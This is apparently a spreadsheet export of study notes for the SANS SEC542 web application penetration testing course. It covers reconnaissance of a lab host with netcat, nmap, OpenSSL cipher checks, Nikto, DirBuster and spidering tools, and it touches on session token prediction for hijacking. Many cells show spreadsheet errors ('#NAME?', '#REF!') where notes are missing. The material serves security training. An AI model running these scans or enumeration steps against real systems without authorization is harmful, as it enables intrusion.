Last-Modified: Sun, 22 Nov 2009 15:52:20 GMT
ETag: ""1c098-49b-478f7b1acf500""
Accept-Ranges: bytes
Content-Length: 1179
Vary: Accept-Encoding
Connection: close
Content-Type: text/html

?$ nc www.sec542.org 443
HEAD / HTTP/1.0
<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN"">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
Reason: You're speaking plain HTTP to an SSL-enabled server port.<br />
Instead use the HTTPS scheme to access this URL, please.<br />
<blockquote>Hint: <a href=""https://www.sec542.org/""><b>https://www.sec542.org/</b></a></blockquote></p>
<hr>
<address>Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.1 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g Server at www.sec542.org Port 443</address>
</body></html>
",2. Recon & Mapping,2.2 Mapping,B2P84,,,,,,sec542/2.2/index.htm#s17,,,,
S542-2.2.18,SEC542,Web Server Fingerprinting Exercise: Nmap,,,,,,"Q3: What services did nmap identify? 
       OpenSSH(22),  ISC Bind (53), http(80), https(443), webmin(10000)
- Q4: How many different web servers apps? Apache/PH and webmin
- Q5: On which ports? 80, 443, 10000
?$ nmap --script=robots www.sec542.org

Starting Nmap 5.00 ( http://nmap.org ) at 2011-03-03 14:37 EST
Interesting ports on sec542 (192.168.1.41):
Not shown: 995 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
|  robots: has 2 disallowed entries 
|_ /cgi-bin/ /admin
443/tcp   open  https
10000/tcp open  snet-sensor-mgmt
",2. Recon & Mapping,2.2 Mapping,B2P85,,,,,,sec542/2.2/index.htm#s18,,,,
S542-2.2.19,SEC542,Web Server Fingerprinting Exercise: HTTPrint,,,,,,#REF!,2. Recon & Mapping,2.2 Mapping,B2P86,,,,,,sec542/2.2/index.htm#s19,,,,
S542-2.2.20,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s20,,,,
S542-2.2.21,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s21,,,,
S542-2.2.22,SEC542,Analyzing SSL Support,,,,,,"- Which SSL versions? SSLv2, v3 or TLSv1
- Which ciphers? 128 bit? NULL cipher?
- Self-signed certs ",2. Recon & Mapping,2.2 Mapping,B2P89,,,,,,sec542/2.2/index.htm#s22,,,,
S542-2.2.23,SEC542,Scripting OpenSSL,,,,,,"- openssl s_client -connect www.sans.org -ssl2
- openssl s_client -connect www.sans.org:443 -cipher NULL
- Very scriptable",2. Recon & Mapping,2.2 Mapping,B2P90,,,,,,sec542/2.2/index.htm#s23,,,,
S542-2.2.24,SEC542,THC SSL Check,,,,,,"- The Hacker's Choice, http://thc.org/root/tools/THCSSLCheck.zip
- wine THCSSLCheck.exe SITE PORT",2. Recon & Mapping,2.2 Mapping,B2P91,,,,,,sec542/2.2/index.htm#s24,,,,
S542-2.2.25,SEC542,SSLDigger,,,,,,-,2. Recon & Mapping,2.2 Mapping,B2P92,,,,,,sec542/2.2/index.htm#s25,,,,
S542-2.2.26,SEC542,Evaluating SSL Support,,,,,,"- Strengh and correct SSL support level depend on site
- SSLv2 weak
- Less than 128 bit encryption
- Weak hashing (MD5)
- Expired, bad or other certificate errors",2. Recon & Mapping,2.2 Mapping,B2P93,,,,,,sec542/2.2/index.htm#s26,,,,
S542-2.2.06,SEC542,p0f,,,,,,"- Approx. 90% accuracy
- lcamtuf.coredump.cx/p0f.shtml",2. Recon & Mapping,2.2 Mapping,B2P73,,,,,,sec542/2.2/index.htm#s6,,,,
S542-2.2.07,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s7,,,,
S542-2.2.08,SEC542,Server Version,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P75,,,,,,sec542/2.2/index.htm#s8,,,,
S542-2.2.27,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s27,,,,
S542-2.2.28,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s28,,,,
S542-2.2.29,SEC542,SSL Strength Exercise: Launching SSLCheck,,,,,,"?/usr/bin/samurai/thcsslcheck$ ./THCSSLCheck.exe www.sec542.org 443 > ~/THC_443.txt
?/usr/bin/samurai/thcsslcheck$ cat ~/THC_443.txt


------------------------------------------------------------------------
THCSSLCheck v0.1 - coding johnny cyberpunk (www.thc.org) 2004
------------------------------------------------------------------------

[*] testing if port is up. pleaze wait...
[*] port is up !
[*] testing if service speaks SSL ...
[*] service speaks SSL !


[*] now testing SSLv2
----------------------------------------------------------------------
                  DES-CBC3-MD5 - 168 Bits -   supported
                  IDEA-CBC-MD5 - 128 Bits - unsupported
                   RC2-CBC-MD5 - 128 Bits -   supported
                       RC4-MD5 - 128 Bits -   supported
                    RC4-64-MD5 -  64 Bits - unsupported
                   DES-CBC-MD5 -  56 Bits -   supported
               EXP-RC2-CBC-MD5 -  40 Bits -   supported
                   EXP-RC4-MD5 -  40 Bits -   supported


[*] now testing SSLv3
----------------------------------------------------------------------
            DHE-RSA-AES256-SHA - 256 Bits - unsupported
            DHE-DSS-AES256-SHA - 256 Bits - unsupported
                    AES256-SHA - 256 Bits - unsupported
          EDH-RSA-DES-CBC3-SHA - 168 Bits -   supported
          EDH-DSS-DES-CBC3-SHA - 168 Bits - unsupported
...",2. Recon & Mapping,2.2 Mapping,B2P96,,,,,,sec542/2.2/index.htm#s29,,,,
S542-2.2.30,SEC542,SSL Strength Exercise: SSLThing,,,,,,"?samurai@samurai-sec542:/usr/bin/samurai/sslthing$ ./sslthing www.sec542.org:443 > ~/sslthing_443.txt
samurai@samurai-sec542:/usr/bin/samurai/sslthing$ cat ~/sslthing_443.txt
Testing SSL2...
DES-CBC3-MD5 - 168 bits
RC2-CBC-MD5 - 128 bits
RC4-MD5 - 128 bits
DES-CBC-MD5 - 56 bits
EXP-RC2-CBC-MD5 - 40 bits
EXP-RC4-MD5 - 40 bits
Testing TLS1...
EDH-RSA-DES-CBC3-SHA - 168 bits
DES-CBC3-SHA - 168 bits
RC4-SHA - 128 bits
RC4-MD5 - 128 bits
EDH-RSA-DES-CBC-SHA - 56 bits
DES-CBC-SHA - 56 bits
EXP-EDH-RSA-DES-CBC-SHA - 40 bits
EXP-DES-CBC-SHA - 40 bits
EXP-RC2-CBC-MD5 - 40 bits
EXP-RC4-MD5 - 40 bits
samurai@samurai-sec542:/usr/bin/samurai/sslthing$ 
",2. Recon & Mapping,2.2 Mapping,B2P97,,,,,,sec542/2.2/index.htm#s30,,,,
S542-2.2.31,SEC542,SSL Strength Exercise: Examine the Results,,,,,,- Q1: Report 1st glance impression? Disable SSLv2,2. Recon & Mapping,2.2 Mapping,B2P98,,,,,,sec542/2.2/index.htm#s31,,,,
S542-2.2.35,SEC542,Load Balancers,,,,,,"- May lead for false negatives (tests appear to have failed)
- Various methods to identify load balancers (analysis of URL, timestamp, last modified  values comparison, load balancer cookies, SSL differences, HTML source code discrepancies)",2. Recon & Mapping,2.2 Mapping,B2P103,,,,,,sec542/2.2/index.htm#s35,,,,
S542-2.2.36,SEC542,Load Balancing via URL,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P104,,,,,,sec542/2.2/index.htm#s36,,,,
S542-2.2.37,SEC542,Load Balancing identification using Timestamp analysis,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P105,,,,,,sec542/2.2/index.htm#s37,,,,
S542-2.2.38,SEC542,Load Balancing identification using Last Modified Date,,,,,,- May help to identify a server app that wasn't updated (finding),2. Recon & Mapping,2.2 Mapping,B2P106,,,,,,sec542/2.2/index.htm#s38,,,,
S542-2.2.39,SEC542,Load Balancing identification using Load Balancer Cookies,,,,,,"- Look for F5, LB, Load or Balance in the cookie-name
- Used to help determien which server to user
- Cisco CSS (content switches) or Big-IP
- Don't recognize a cookie? Google it!",2. Recon & Mapping,2.2 Mapping,B2P107,,,,,,sec542/2.2/index.htm#s39,,,,
S542-2.2.40,SEC542,Load Balancing identification using SSL Differences,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P108,,,,,,sec542/2.2/index.htm#s40,,,,
S542-2.2.32,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s32,,,,
S542-2.2.42,SEC542,Testing Web Apps on Load-Balanced Architectures,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P110,,,,,,sec542/2.2/index.htm#s42,,,,
S542-2.2.43,SEC542,Test Modifications for Load Balancers,,,,,,"- If possible, address each server individually (www1, www2�). May required testing from inside
- Modify load balancer to direct tester's traffic (client IP address)",2. Recon & Mapping,2.2 Mapping,B2P111,,,,,,sec542/2.2/index.htm#s43,,,,
S542-2.2.44,SEC542,Analyzing Software Configs,,,,,,-,2. Recon & Mapping,2.2 Mapping,B2P112,,,,,,sec542/2.2/index.htm#s44,,,,
S542-2.2.45,SEC542,Software Configuration,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P113,,,,,,sec542/2.2/index.htm#s45,,,,
S542-2.2.46,SEC542,HTTP Request Methods Supported,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P114,,,,,,sec542/2.2/index.htm#s46,,,,
S542-2.2.41,SEC542,Load Balancing identification using HTML Source Differences,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P109,,,,,,sec542/2.2/index.htm#s41,,,,
S542-2.2.34,SEC542,Virtual Hosting,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P101,,,,,,sec542/2.2/index.htm#s34,,,,
S542-2.2.47,SEC542,Netcat to Determine Supported HTTP Methods,,,,,,"for method in GET POST PUT TRACE CONNECT OPTIONS;
do
  printf ""$method / HTTP/1.1\nHost: target.tgt\n\n""| nc target.tgt 80
done
Some methods may be turned on at different levels of the site",2. Recon & Mapping,2.2 Mapping,B2P115,,,,,,sec542/2.2/index.htm#s47,,,,
S542-2.2.50,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s50,,,,
S542-2.2.51,SEC542,Nikto Exercise: Goals,,,,,,-,2. Recon & Mapping,2.2 Mapping,B2P119,,,,,,sec542/2.2/index.htm#s51,,,,
S542-2.2.52,SEC542,Nikto Exercise: Scan Port 80,,,,,,"?/usr/bin/samurai/nikto$ ./nikto.pl -host www.sec542.org -Format HTM -out ~/nikto.html
---------------------------------------------------------------------------
+ Target IP:          192.168.1.41
+ Target Hostname:    www.sec542.org
+ Target Port:        80
+ Start Time:         2011-03-04 18:43:51
---------------------------------------------------------------------------
+ Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.1 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g
- /robots.txt - contains 2 'disallow' entries which should be manually viewed. (GET)
- Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP method ('Allow' Header): 'TRACE' is typically only used for debugging and should be disabled. This message does not mean it is vulnerable to XST.
+ OSVDB-0: ETag header found on server, inode: 114654, size: 51, mtime: 0x46bb0b19b3e40
+ PHP/5.2.6-2ubuntu4.1 appears to be outdated (current is at least 5.2.6RC4)
+ mod_ssl/2.2.9 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ mod_ssl/2.2.9 OpenSSL/0.9.8g - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell (difficult to exploit). http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2002-0082.
+ OSVDB-637: GET /~root/ : Allowed to browse root's home directory.
+ OSVDB-3233: GET /phpinfo.php : Contains PHP configuration information
+ OSVDB-48: GET /doc/ : The /doc/ directory is browsable. This may be /usr/doc.
+ OSVDB-877: TRACE / : TRACE option appears to allow XSS or credential theft. See http://www.cgisecurity.com/whitehat-mirror/WhitePaper_screen.pdf for details
+ OSVDB-3092: GET /backdoor/ : This might be interesting...
+ OSVDB-3092: GET /forum/ : This might be interesting...
+ OSVDB-3092: GET /test/ : This might be interesting...
+ OSVDB-3268: GET /icons/ : Directory indexing is enabled: /icons
+ OSVDB-3282: GET /uploader.php : This script may allow arbitrary files to be uploaded to the remote server.
+ OSVDB-3233: GET /icons/README : Apache default file found.
+ 3577 items checked: 17 item(s) reported on remote host
+ End Time:        2011-03-04 18:44:08 (17 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
",2. Recon & Mapping,2.2 Mapping,B2P120,,,,,,sec542/2.2/index.htm#s52,,,,
S542-2.2.48,SEC542,Default pages,,,Access to default web server content,,2,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P116,"Weaknesses in this category are typically introduced during the configuration of the software, often due to poor harderning. Keeping default content from web servers increases the attack surface.",,,,,sec542/2.2/index.htm#s48,16,,,
S542-2.2.49,SEC542,Nikto,,,,,,"- www.cirt.net
- Check the MD5 hash of favicons to find-out what web server it is
- Lots of false positives (no content double-checks)
- Not hard to setup. One single file. Handles SSL.",2. Recon & Mapping,2.2 Mapping,B2P117,,,,,,sec542/2.2/index.htm#s49,,,,
S542-2.2.53,SEC542,Nikto Exercise: Analyzing Initial Scan,,,,,,"- Q1: What's intesting  in nikto's output? Supported methods, mod_ssl vuln, scripts, defaults
- Q2: What info can be discovered about the system? PHP/mod_ssl versions, new vulns
- Q3: Based on Nikto, what action items are for the client?
      Harden Apache (methods, access controls), update mod_ssl, remove unused scripts/files",2. Recon & Mapping,2.2 Mapping,B2P121,,,,,,sec542/2.2/index.htm#s53,,,,
S542-2.2.54,SEC542,Nikto Exercise: Q&A,,,,,,-,2. Recon & Mapping,2.2 Mapping,B2P122,,,,,,sec542/2.2/index.htm#s54,,,,
S542-2.2.55,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s55,,,,
S542-2.3.01,SEC542,Spidering: Section Objectives,,,,,,"Techniques that can be used to spider a site, robots and robot control, how to spider a site and tools that can be used to do it, commented code, disabled functionality, converting HTML into Text, identifying Linked Servers and sniffing while spidering and finding linked servers using (wireshark and TCPdump).",2. Recon & Mapping,2.3 Spidering,B2P124,,,,,,sec542/2.3/index.htm#s1,,,,
S542-2.3.04,SEC542,Spidering Methods,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P127,,,,,,sec542/2.3/index.htm#s4,,,,
S542-2.3.05,SEC542,WebScarab Spidering,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P128,,,,,,sec542/2.3/index.htm#s5,,,,
S542-2.3.06,SEC542,WebScarab Spider Configuration,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P129,,,,,,sec542/2.3/index.htm#s6,,,,
S542-2.3.07,SEC542,Paros Spidering,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P130,,,,,,sec542/2.3/index.htm#s7,,,,
S542-2.3.08,SEC542,Burp Spidering,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P131,,,,,,sec542/2.3/index.htm#s8,,,,
S542-2.3.09,SEC542,Wget Spidering,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P132,,,,,,sec542/2.3/index.htm#s9,,,,
S542-2.3.10,SEC542,Specialized Spidering Tools,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P133,,,,,,sec542/2.3/index.htm#s10,,,,
S542-2.3.11,SEC542,,,,,,,,2. Recon & Mapping,2.3 Spidering,,,,,,,sec542/2.3/index.htm#s11,,,,
S542-2.3.12,SEC542,,,,,,,,2. Recon & Mapping,2.3 Spidering,,,,,,,sec542/2.3/index.htm#s12,,,,
S542-2.3.13,SEC542,Spidering Exercise: Wget,,,,,,"- wget -r http://www.sec542.org
- Q1: Why are there discrepancies between the orig site and the wget download?
   A1: wget doesn't handle dynamically generated links (javascript), no creds were provided, no bruteforcing...
- Q2 - Q4 (answers at pg 143)
",2. Recon & Mapping,2.3 Spidering,B2P136,,,,,,sec542/2.3/index.htm#s13,,,,
S542-2.3.14,SEC542,Spidering Exercise: WebScarab,,,,,,,2. Recon & Mapping,2.3 Spidering,B2P137,,,,,,sec542/2.3/index.htm#s14,,,,
S542-2.3.15,SEC542,,,,,,,,2. Recon & Mapping,2.3 Spidering,,,,,,,sec542/2.3/index.htm#s15,,,,
S542-2.3.03,SEC542,Robot Control,,,,,,"- Well behaved robots will follow rules (targets of interest)
- In robots.txt 
  User-agent: *
  Disallow: /images/
- Meta tag to control search engines
  <META NAME=""ROBOTS""CONTENT=""INDEX,NOFOLLOW"">
  <META NAME=""GOOGLEBOT"" CONTENT=""NOARCHIVE"">
- Tags to prevent caching of content
   <META HTTP-EQUIV=""PRAGMA"" CONTENT=""NO-CACHE"">
   <META HTTP-EQUIV=""PRAGMA"" CONTENT=""NO-CACHE"">
- Don't use robot control as security mechanism!",2. Recon & Mapping,2.3 Spidering,B2P126,,,,,,sec542/2.3/index.htm#s3,,,,
S542-2.3.17,SEC542,,,,,,,,2. Recon & Mapping,2.3 Spidering,,,,,,,sec542/2.3/index.htm#s17,,,,
S542-2.3.18,SEC542,,,,,,,,2. Recon & Mapping,2.3 Spidering,,,,,,,sec542/2.3/index.htm#s18,,,,
S542-2.3.19,SEC542,Spidering Exercise: CeWL,,,,,,- ?/usr/bin/samurai/cewl$ ./cewl.rb http://www.sec542.org,2. Recon & Mapping,2.3 Spidering,B2P142,,,,,,sec542/2.3/index.htm#s19,,,,
S542-2.3.02,SEC542,Spidering the Target Site,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P125,,,,,,sec542/2.3/index.htm#s2,,,,
S542-2.3.16,SEC542,Spidering Exercise: Burp,,,,,,,2. Recon & Mapping,2.3 Spidering,B2P139,,,,,,sec542/2.3/index.htm#s16,,,,
S542-2.3.22,SEC542,Spidering Results Analysis,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P145,,,,,,sec542/2.3/index.htm#s22,,,,
S542-2.3.23,SEC542,HTML Comments,,,,,,"- Sometimes the username/passwords
- <?php //Don't forget to fix the auth bug ?>  (stays on server side)",2. Recon & Mapping,2.3 Spidering,B2P146,,,,,,sec542/2.3/index.htm#s23,,,,
S542-2.3.24,SEC542,Disabled Functionality,,,,,,-,2. Recon & Mapping,2.3 Spidering,B2P147,,,,,,sec542/2.3/index.htm#s24,,,,
S542-2.3.20,SEC542,Spidering Exercise: Q&A,,,,,,,2. Recon & Mapping,2.3 Spidering,B2P143,,,,,,sec542/2.3/index.htm#s20,,,,
S542-2.3.21,SEC542,,,,,,,,2. Recon & Mapping,2.3 Spidering,,,,,,,sec542/2.3/index.htm#s21,,,,
S542-2.3.25,SEC542,Types of Disabled Functionality,,,,,,"- Commented-out links, 
- Commented-out code (logic errors, hidden pages, outdated functionality)
- Dead-end functions",2. Recon & Mapping,2.3 Spidering,B2P148,,,,,,sec542/2.3/index.htm#s25,,,,
S542-2.3.26,SEC542,Convert HTML to Text,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P150,,,,,,sec542/2.3/index.htm#s26,,,,
S542-2.4.03,SEC542,App Flow Charting with Pen and Paper,,,,,,-,2. Recon & Mapping,2.4 App Flow Charting,B2P153,,,,,,sec542/2.4/index.htm#s3,,,,
S542-2.4.04,SEC542,App Flow Charting with Diagramming Software,,,,,,"- Visio 2003 has add-on to spider a web site
- Kivio (OpenSource, KDE) adn Omnigraffle (Mac OS X, The Omni Group)
- Dia (OpenSource)",2. Recon & Mapping,2.4 App Flow Charting,B2P154,,,,,,sec542/2.4/index.htm#s4,,,,
S542-2.4.05,SEC542,App Flow Charting with Spidering Software,,,,,,#NAME?,2. Recon & Mapping,2.4 App Flow Charting,B2P155,,,,,,sec542/2.4/index.htm#s5,,,,
S542-2.4.06,SEC542,,,,,,,,2. Recon & Mapping,2.4 App Flow Charting,,,,,,,sec542/2.4/index.htm#s6,,,,
S542-2.4.07,SEC542,Relationship Analysis,,,,,,#NAME?,2. Recon & Mapping,2.4 App Flow Charting,B2P157,,,,,,sec542/2.4/index.htm#s7,,,,
S542-2.4.08,SEC542,Relationship Analysis: Dividing the App into Sections,,,,,,#NAME?,2. Recon & Mapping,2.4 App Flow Charting,B2P158,,,,,,sec542/2.4/index.htm#s8,,,,
S542-2.4.09,SEC542,Relationship Analysis: Looking for Missed Pages,,,,,,#NAME?,2. Recon & Mapping,2.4 App Flow Charting,B2P159,,,,,,sec542/2.4/index.htm#s9,,,,
S542-2.4.10,SEC542,Identifying Code Styles,,,,,,"- Find weakness in code styles from diff. developers or diff. tools (notes features of DreamWeavers, .mno files, schema files)",2. Recon & Mapping,2.4 App Flow Charting,B2P160,,,,,,sec542/2.4/index.htm#s10,,,,
S542-2.4.11,SEC542,Different Developers Could Lead to Security Flaws,,,,,,"- Where developers write code
- Assumptions to be exploited (pre-authz, session token)
- Input filtering only to block XSS, Output encoding only",2. Recon & Mapping,2.4 App Flow Charting,B2P161,,,,,,sec542/2.4/index.htm#s11,,,,
S542-2.4.12,SEC542,Identifying Naming Systems: Used in a Web App,,,,,,#NAME?,2. Recon & Mapping,2.4 App Flow Charting,B2P162,,,,,,sec542/2.4/index.htm#s12,,,,
S542-2.4.13,SEC542,Finding Other Pages,,,,,,#NAME?,2. Recon & Mapping,2.4 App Flow Charting,B2P163,,,,,,sec542/2.4/index.htm#s13,,,,
S542-2.4.14,SEC542,OWASP DirBuster,,,,,,#NAME?,2. Recon & Mapping,2.4 App Flow Charting,B2P164,,,,,,sec542/2.4/index.htm#s14,,,,
S542-2.4.15,SEC542,,,,,,,,2. Recon & Mapping,2.4 App Flow Charting,,,,,,,sec542/2.4/index.htm#s15,,,,
S542-2.4.16,SEC542,,,,,,,,2. Recon & Mapping,2.4 App Flow Charting,,,,,,,sec542/2.4/index.htm#s16,,,,
S542-2.4.17,SEC542,,,,,,,,2. Recon & Mapping,2.4 App Flow Charting,,,,,,,sec542/2.4/index.htm#s17,,,,
S542-2.4.18,SEC542,DirBuster Exercise,,,,,,"-? /usr/bin/samurai/DirBuster-1.0-RC1$ java -jar DirBuster-1.0-RC1.jar
- Limit threads to 5-10. 
- ?Small list: /usr/bin/samurai/DirBuster-1.0-RC1/directory-list-lowercase-2.3-small.txt",2. Recon & Mapping,2.4 App Flow Charting,B2P168,,,,,,sec542/2.4/index.htm#s18,,,,
S542-2.4.19,SEC542,,,,,,,,2. Recon & Mapping,2.4 App Flow Charting,,,,,,,sec542/2.4/index.htm#s19,,,,
S542-2.4.20,SEC542,,,,,,,,2. Recon & Mapping,2.4 App Flow Charting,,,,,,,sec542/2.4/index.htm#s20,,,,
S542-2.4.01,SEC542,App. Flowcharting: Section Objectives,,,,,,"Techniques used to identify the logic flow of a web application, the basic methods for application flow charting, techniques for relationship analysis OWAS DirBuster, how to gather and analyze session tokens, and session token analysis with WebScarab.",2. Recon & Mapping,2.4 App Flow Charting,B2P151,,,,,,sec542/2.4/index.htm#s1,,,,
S542-2.4.02,SEC542,Application Flow Charting,,,,,,#NAME?,2. Recon & Mapping,2.4 App Flow Charting,B2P152,,,,,,sec542/2.4/index.htm#s2,,,,
S542-2.4.21,SEC542,Session Token Gathering,,,,,,"- To hijack other  people's session
- Predict previous sessions most of the time (active sessions)
- Manually, scripts or WebScarab",2. Recon & Mapping,2.4 Session Analysis,B2P171,,,,,,sec542/2.4/index.htm#s21,,,,
S542-2.4.22,SEC542,Session Token Variables,,,,,,"- 3 typical ways: URL, Hidden form field, Cookies (JSESSIONID)
- Sometimes multiple ways (URL + cookies, multiple cookies)
- ColdFusion: CFID (predictable) CFTOKEN added later optionally (harder to predict)",2. Recon & Mapping,2.4 Session Analysis,B2P172,,,,,,sec542/2.4/index.htm#s22,,,,
S542-2.4.23,SEC542,Identifying Session Tokens,,,,,,#NAME?,2. Recon & Mapping,2.4 Session Analysis,B2P173,,,true,,,sec542/2.4/index.htm#s23,,,,
S542-2.4.24,SEC542,Session Token Predictability,,,,,,#NAME?,2. Recon & Mapping,2.4 Session Analysis,B2P174,,,,,,sec542/2.4/index.htm#s24,,,,
S542-2.4.25,SEC542,Manually Collecting Session Credentials,,,,,,#NAME?,2. Recon & Mapping,2.4 Session Analysis,B2P175,,,,,,sec542/2.4/index.htm#s25,,,,
S542-2.4.26,SEC542,Collecting Session Credentials via Customized Scripts,,,,,,"- If WebScarab doesn't work, use python script (ses slide)",2. Recon & Mapping,2.4 Session Analysis,B2P176,,,,,,sec542/2.4/index.htm#s26,,,,
S542-2.4.29,SEC542,,,,,,,,2. Recon & Mapping,2.4 Session Analysis,,,,,,,sec542/2.4/index.htm#s29,,,,
S542-2.4.30,SEC542,Session Anal. Exercise: WebScarab,,,,,,#NAME?,2. Recon & Mapping,2.4 Session Analysis,B2P180,,,,,,sec542/2.4/index.htm#s30,,,,
S542-2.4.31,SEC542,,,,,,,,2. Recon & Mapping,2.4 Session Analysis,,,,,,,sec542/2.4/index.htm#s31,,,,
S542-2.4.27,SEC542,WebScarab Session Token Gathering and Analysis,,,,,,#NAME?,2. Recon & Mapping,2.4 Session Analysis,B2P177,,,,,,sec542/2.4/index.htm#s27,,,,
S542-2.4.33,SEC542,Session Anal. Exercise: Burp,,,,,,"- In Burp, right-click session initiation page  and ""send to sequencer""
- Select Sequencer tab, select URL and click Start Capture
- Click Analyze Now and view the report",2. Recon & Mapping,2.4 Session Analysis,B2P183,,,,,,sec542/2.4/index.htm#s33,,,,
S542-2.4.28,SEC542,Burp Sequencer Session Analysis,,,,,,"- Burp has a series of tests bullt-in (mathematical tests to verify entropy)
- FIPS 140-2 analysis
- Graphs and charts, explanations for the tests
- Can load file with session tokens",2. Recon & Mapping,2.4 Session Analysis,B2P178,,,,,,sec542/2.4/index.htm#s28,,,,
S542-2.4.32,SEC542,Session Anal. Exercise: Testing Jetty,,,,,,"- Start-up Jetty App Server in SEC542 VM
- Fetch 1000 session IDs with WebScarab using Webmin and Jetty
- In WebScarab, click SessionID Analysis tab and select from Preview Requests pull-down
- Click Test and in pop-up, check the session ID captured (if it appears OK)
- Set number of samples to 1000 and click on Fetch
- Switch to Analysis tab and select entry from Session Identifier pull-down
- Switch over to Visualizaition tab to see randomness chart",2. Recon & Mapping,2.4 Session Analysis,B2P182,,,,,,sec542/2.4/index.htm#s32,,,,
S542-3.1.02,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s2,,,,
S542-3.1.01,SEC542,Application Discovery,,,,,,"Automated tools used to find web application vulnerabilities and their distinguisihing features, Grendel-Scan, w3af, the Burp Suite and the Samauri Suite.",3. Server-Side Disc.,3.1 Scanners,B3P01,,,,,,sec542/3.1/index.htm#s1,,,,
S542-3.1.05,SEC542,Vunerability Discovery,,,,,,"- First malicious traffic sent to web site
- Looking for potential weaknesses
- Find the path to exploitation
- Builds on work and discoveries of previous 2 steps",3. Server-Side Disc.,3.1 Scanners,B3P05,,,,,,sec542/3.1/index.htm#s5,,,,
S542-3.1.06,SEC542,Vuln Discovery Phase Elements,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P06,,,,,,sec542/3.1/index.htm#s6,,,,
S542-3.1.07,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s7,,,,
S542-3.1.03,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s3,,,,
S542-3.1.04,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s4,,,,
S542-3.1.08,SEC542,Web App Vulnerability Scanners,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P08,,,,,,sec542/3.1/index.htm#s8,,,,
S542-3.1.11,SEC542,Grendel-Scan,,,,,,"- Cross-platform, in Java. http://grendel-scan.com
- Automated to help with manual tests
- Accept multiple URLs",3. Server-Side Disc.,3.1 Scanners,B3P11,,,,,,sec542/3.1/index.htm#s11,,,,
S542-3.1.12,SEC542,Glendel Mapping Mode,,,,,,"- 2 methods to build a map of an application
1. Spidering with base URLs, handling JavaScript pretty well
2. Single shot interception proxy. Manually walk through                                                                          app. Then later, the automated scan can be run from there.",3. Server-Side Disc.,3.1 Scanners,B3P12,,,,,,sec542/3.1/index.htm#s12,,,,
S542-3.1.09,SEC542,Choosing Plug-Ins,,,,,,"- Run the tool multiple times with one plugin at a time
1. Spider and Information Gathering Types
2. Spider, SQL Injection, File Include, OS Command Injection
3. Spider, XSS, XSRF
4. Spider and plug-ins based on the previous 3 scans",3. Server-Side Disc.,3.1 Scanners,B3P09,,,,,,sec542/3.1/index.htm#s9,,,,
S542-3.1.14,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s14,,,,
S542-3.1.13,SEC542,Grendel Discovery Plug-ins,,,,,,"- Grendel is an assessment tool (no exploitation)
- Nessus-like but for web apps
- Plugins with * are experimental (higher rate of false-positives and false-negatives)",3. Server-Side Disc.,3.1 Scanners,B3P13,,,,,,sec542/3.1/index.htm#s13,,,,
S542-3.1.10,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s10,,,,
S542-3.1.16,SEC542,Grendel Exercise: Configure the Spider,,,,,,"- /usr/bin/samurai/grendel-scan$ ./grendel.sh
- General Settings: 
  Base URLs: www.sec542.org, www.sec542.org/scanners
  Output Directory: /home/samurai/scanresults/grendel

